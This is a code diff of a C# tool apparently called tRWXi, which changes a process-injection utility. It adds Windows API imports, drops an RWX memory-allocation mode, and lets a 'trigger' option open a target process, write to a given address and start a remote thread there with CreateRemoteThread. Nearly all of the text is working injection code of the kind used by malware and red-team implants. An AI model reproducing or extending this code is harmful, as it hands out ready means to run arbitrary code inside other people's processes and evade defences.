@@ -10,7 +10,6 @@ namespace tRWXi
 {
     public class Program
     {
-
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
 
@@ -74,6 +73,12 @@ namespace tRWXi
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern IntPtr GetCurrentProcess();
 
+        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+        public static extern IntPtr GetModuleHandle(string lpModuleName);
+
         private const Int32 TH32CS_SNAPPROCESS = 0x02;
         private const Int32 PAGE_EXECUTE_READ_WRITE = 0x40;
         private const Int32 MEM_COMMIT = 0x1000;
@@ -126,13 +131,7 @@ namespace tRWXi
                         lpAddress = IntPtr.Zero;
                     }
                 }
-                else if (parameters.ContainsKey("allocate"))
-                {
-                    IntPtr addr = VirtualAlloc(IntPtr.Zero, Convert.ToUInt32(parameters["size"], 16), 0x3000, 0x40);
-                    Console.WriteLine("[+] PID: {0}, ADDR: 0x{1}", System.Diagnostics.Process.GetCurrentProcess().Id, addr.ToString());
-                    while (true) { }
-                }
-                else if (parameters.ContainsKey("inject") || parameters.ContainsKey("trigger") || parameters.ContainsKey("read"))
+                else if (parameters.ContainsKey("inject") || parameters.ContainsKey("read") || parameters.ContainsKey("trigger"))
                 {
                     if (parameters.ContainsKey("pid") && parameters.ContainsKey("address"))
                     {
@@ -174,11 +173,12 @@ namespace tRWXi
                         }
                         else {}
 
-                        if (parameters.ContainsKey("execute"))
+                        if (parameters.ContainsKey("execute") || parameters.ContainsKey("trigger"))
                         {
+                            IntPtr res = IntPtr.Zero;
                             Console.WriteLine("[!] Starting execution...");
-                            IntPtr res = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
-                            if ((int)res != 0)
+                            res = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+                            if (res != IntPtr.Zero)
                             {
                                 Console.WriteLine(String.Format("[+] Successfully executed code. Thread handle [{0}] has been created", res.ToInt64()));
                             }
